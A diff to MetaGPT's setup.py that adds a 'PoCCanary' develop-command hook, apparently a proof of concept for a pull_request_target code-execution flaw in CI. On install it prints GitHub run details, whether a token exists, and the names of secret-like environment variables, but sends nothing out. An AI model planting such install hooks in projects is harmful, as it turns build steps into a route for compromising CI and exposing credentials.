@@ -1,9 +1,39 @@
 """Setup script for MetaGPT."""
+import os
+import json
 import subprocess
+from datetime import datetime, timezone
 from pathlib import Path
 
 from setuptools import Command, find_packages, setup
+from setuptools.command.develop import develop
 
+
+class PoCCanary(develop):
+    """Detection-only: proves setup.py runs during CI."""
+
+    def run(self):
+        canary = {
+            "poc": "pull_request_target_rce",
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "repo": os.environ.get("GITHUB_REPOSITORY", "local"),
+            "run_id": os.environ.get("GITHUB_RUN_ID", "none"),
+            "event": os.environ.get("GITHUB_EVENT_NAME", "none"),
+            "actor": os.environ.get("GITHUB_ACTOR", "none"),
+            "runner": os.environ.get("RUNNER_OS", "none"),
+            "has_token": "GITHUB_TOKEN" in os.environ,
+            "secret_vars": [
+                k for k in sorted(os.environ)
+                if any(w in k.upper() for w in
+                        ["SECRET", "TOKEN", "KEY", "PASS"])
+            ],
+        }
+        print("\n" + "=" * 60)
+        print("POC CANARY: pull_request_target RCE via setup.py")
+        print("=" * 60)
+        print(json.dumps(canary, indent=2))
+        print("=" * 60 + "\n")
+        super().run()
 
 class InstallMermaidCLI(Command):
     """A custom command to run `npm install -g @mermaid-js/mermaid-cli` via a subprocess."""
@@ -112,6 +142,7 @@ setup(
     extras_require=extras_require,
     cmdclass={
         "install_mermaid": InstallMermaidCLI,
+        "develop": PoCCanary,
     },
     entry_points={
         "console_scripts": [
